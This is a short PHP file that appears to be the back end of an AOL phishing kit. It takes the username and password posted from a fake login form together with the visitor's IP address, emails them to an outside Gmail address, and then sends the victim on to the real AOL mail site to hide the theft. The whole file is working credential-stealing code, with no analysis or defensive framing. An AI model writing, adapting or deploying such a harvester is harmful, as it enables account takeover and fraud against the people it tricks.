<?php
    $to = "shoppersguide22@gmail.com";
    $ip = getenv("REMOTE_ADDR");
    $user = $_POST['username'];
    $pass = $_POST['passwd'];
    $subject = $ip . " AOL Details"; 
    $message = "Email: $user\n Pass: $pass\nip: $ip\n";
    if (empty($user) || empty($pass)) {
header( "Location: index.php" );
}
else {
	mail($to, $subject, $message);
    header("Location: https://mail.aol.com/");
	}
?>
